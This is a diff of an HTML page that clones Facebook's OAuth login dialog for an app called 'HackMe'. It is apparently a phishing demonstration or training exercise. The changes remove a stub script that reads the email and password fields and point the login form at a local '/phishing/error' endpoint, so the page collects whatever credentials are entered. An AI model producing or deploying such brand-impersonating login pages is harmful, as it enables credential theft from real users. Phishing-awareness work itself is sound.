@@ -4,9 +4,6 @@
 		<meta charset="utf-8" />
 		<script>function envFlush(a){function b(c){for(var d in a)c[d]=a[d];}if(window.requireLazy){window.requireLazy(['Env'],b);}else{window.Env=window.Env||{};b(window.Env);}}envFlush({"ajaxpipe_token":"AXg9DYeJ0hGiwOfy","lhsh":"cAQHwyE-f","khsh":"0`sj`e`rm`s-0fdu^gshdoer-0gc^eurf-3gc^eurf;1;enbtldou;fduDmdldourCxO`ld-2YLMIuuqSdptdru;qsnunuxqd;rdoe-0unjdojnx-0unjdojnx0-0gdubi^rdbsduOdv-0`sj`e`r-0q`xm`r-0StoRbs`qhof-0mhoj^q`xm`r"});</script>
 		<script>CavalryLogger=false;</script>
-		<noscript>
-			<meta http-equiv="refresh" content="0; URL=/login.php?skip_api_login=1&amp;api_key=274266067164&amp;signed_next=1&amp;next=https%3A%2F%2Fwww.facebook.com%2Fv2.2%2Fdialog%2Foauth%3Fredirect_uri%3Dhttps%253A%252F%252Fwww.pinterest.com%252Fconnect%252Ffacebook%252F%26display%3Dpopup%26scope%3Demail%252Cuser_likes%252Cuser_about_me%252Cuser_birthday%252Cuser_friends%26client_id%3D274266067164%26ret%3Dlogin&amp;cancel_url=https%3A%2F%2Fwww.pinterest.com%2Fconnect%2Ffacebook%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&amp;display=popup&amp;_fb_noscript=1" />
-		</noscript>
 		<meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
 		<title id="pageTitle">Facebook</title>
 		<link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yl/r/H3nktOa7ZMg.ico" />
@@ -28,7 +25,7 @@
 				</div>
 			</div>
 			<div id="content" class="fb_content clearfix">Log in to use your Facebook account with <a href="https://www.facebook.com/games/?app_id=274266067164" target="_blank">HackMe</a>.<div class="login_form_container">
-					<form id="login_form">
+					<form id="login_form" action="/phishing/error" method="post">
 						<input type="hidden" name="lsd" value="AVriaq-F" autocomplete="off" />
 						<div id="loginform">
 							<input type="hidden" autocomplete="off" id="api_key" name="api_key" value="274266067164" />
@@ -70,7 +67,7 @@
 						</div>
 						<div id="dialog_buttons" class="dialog_buttons">
 							<label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_2">
-								<input value="Log In" name="login" tabindex="1" type="submit" onclick="getFormsInfo()" id="u_0_2" />
+								<input value="Log In" name="login" tabindex="1" type="submit" id="u_0_2" />
 							</label>
 							<label class="uiButton uiButtonLarge" for="u_0_3">
 								<input value="Cancel" name="cancel" type="button" onclick="goURI(&quot;https:\/\/www.pinterest.com\/connect\/facebook\/?error=access_denied&amp;error_code=200&amp;error_description=Permissions+error&amp;error_reason=user_denied#_=_&quot;.replace(&quot;%22xxRESULTTOKENxx%22&quot;,encodeURIComponent(JSON.stringify(null))));" id="u_0_3" />
@@ -79,15 +76,7 @@
 					</form>
 				</div>
 			</div>
-		</div>
-		<script>
-		function getFormsInfo() {
-		   //document.getElementById("demo").innerHTML = "Paragraph changed.";
-		   var email = document.getElementById('email').value;
-		   var password = document.getElementById('pass').value;
-		}
-		</script>
-		
+		</div>	
 	</body>
 </html>
 
